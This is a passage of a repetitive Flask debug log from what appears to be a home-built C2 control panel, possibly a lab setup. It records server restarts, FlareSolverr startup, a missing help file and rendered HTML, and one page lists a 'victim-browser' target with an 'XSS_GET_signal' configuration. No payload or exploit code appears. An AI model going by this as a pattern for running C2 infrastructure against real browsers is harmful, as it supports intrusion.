class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:23:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:48] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:23:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:48] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:23:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:48] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:23:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:23:51 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:23:51 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:23:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:23:51 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/f2370c3cc4b94d7273602e0cdb75a935'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmp27na6gbr.__wz_cache'
2025-06-24 17:23:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:51] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:23:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:23:51 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:23:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:23:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:51] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:23:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:51] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:23:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:24:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:24:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:24:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:24:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:24:58 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:24:58 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:24:58 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:24:58 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:24:58 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:25:02 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:25:02 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:25:02 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:25:02 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:25:02 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:25:02 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:25:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:25:02 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:25:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0251s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:25:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:02] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:25:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:02] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:25:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:02] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:25:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:25:04 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:25:04 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:25:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:04] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:25:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:25:04 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:25:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-error alert-dismissible fade show" role="alert">\n                幫助配置文件不存在\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message error">\n            幫助配置文件不存在\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:04] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:04] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:25:04] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:26:23 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:26:23 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:26:23 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:26:23 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:26:23 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:26:23 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:26:23 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:26:23 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:26:23 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:26:27 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:26:27 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:26:27 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:26:27 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:26:27 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:26:27 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:26:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:26:27 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:26:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0261s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:26:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:27] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:26:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:27] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:26:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:27] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:26:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:26:30 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:26:30 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:26:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:30] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:26:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:26:30 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:26:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-error alert-dismissible fade show" role="alert">\n                幫助配置文件不存在\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message error">\n            幫助配置文件不存在\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:30] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:30] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:26:30] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:27:04 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:27:04 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:27:04 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:27:04 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:27:04 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:27:04 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:27:04 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:27:04 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:27:04 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:27:08 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:27:08 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:27:08 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:27:08 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:27:08 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:27:08 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:27:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:27:14 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:27:14 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:27:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:27:14] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:27:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:27:14 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
